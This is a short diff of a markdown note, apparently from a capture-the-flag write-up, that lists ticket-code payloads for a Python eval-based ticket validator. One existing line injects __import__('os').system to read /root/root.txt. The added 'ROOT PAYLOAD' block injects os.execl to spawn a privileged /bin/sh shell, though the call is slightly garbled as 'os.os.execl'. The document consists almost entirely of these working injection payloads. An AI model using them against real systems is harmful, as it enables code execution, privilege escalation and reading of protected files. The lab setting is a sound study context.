@@ -11,4 +11,14 @@ the ticket is in format  filename.md:
 __Ticket Code:__
 **102+ 10 == 112 and __import__('os').system('cat /root/root.txt') == False
 
+
+
+########ROOT PAYLOAD#####
+
+# Skytrain Inc 
+## Ticket to 
+__Ticket Code:__
+**102+ 10 == 112 and __import__('os').os.execl("/bin/sh", "sh", "-p")
+
 OSS: note that after Ticket to there's a blank space.
+
